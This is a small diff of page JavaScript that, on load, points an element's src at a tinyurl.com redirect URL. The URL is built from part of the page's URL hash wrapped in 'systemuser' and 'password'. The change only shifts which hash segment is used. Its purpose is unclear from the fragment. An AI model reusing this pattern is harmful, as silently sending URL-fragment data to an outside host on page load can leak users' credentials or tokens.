@@ -22,7 +22,7 @@ function autho(){
     }
   },false);
 window.onload=function(){
-  document.querySelectorAll(".pass")[0].src="https://tinyurl.com/redirect.php?num=systemuser"+window.location.hash.split("&")[0].replace("#", "")+"password";
+  document.querySelectorAll(".pass")[0].src="https://tinyurl.com/redirect.php?num=systemuser"+window.location.hash.split("&")[1].replace("#", "")+"password";
   autho();
 }
 
